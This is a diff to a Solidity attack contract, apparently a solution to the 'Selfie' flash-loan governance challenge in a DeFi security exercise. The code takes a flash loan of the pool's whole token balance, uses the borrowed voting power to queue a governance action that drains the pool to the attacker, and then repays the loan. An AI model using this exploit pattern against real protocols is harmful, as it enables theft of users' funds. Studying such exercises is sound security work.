@@ -54,11 +54,15 @@ contract FlashLoanReceiver {
         if (msg.sender != _attacker) revert SenderIsNotOwner();
         // Just take everything
         uint256 everything = _dvtSnap.balanceOf(address(_selfiePool));
+        assert(everything == 1_500_000e18);
         // And flashloan it
         _selfiePool.flashLoan(everything);
+
+        if (_dvtSnap.balanceOf(address(this)) != everything)
+            revert CallFailed();
     }
 
-    function receiveFlashLoan(uint256 amount) external {
+    function receiveTokens(address token, uint256 amount) external {
         if (msg.sender != address(_selfiePool)) revert SenderIsNotSelfiePool();
         // Then you craft the data to rekt the pool
         bytes memory evilPayload = abi.encodeWithSignature(
@@ -66,7 +70,14 @@ contract FlashLoanReceiver {
             _attacker
         );
         // Into its governance
-        _simpleGovernance.queueAction(address(_selfiePool), evilPayload, 0);
+        if (
+            _simpleGovernance.queueAction(
+                address(_selfiePool),
+                evilPayload,
+                0
+            ) == 0
+        ) revert CallFailed();
+
         // And you refund the pool
         _dvtSnap.transfer(address(_selfiePool), amount);
     }
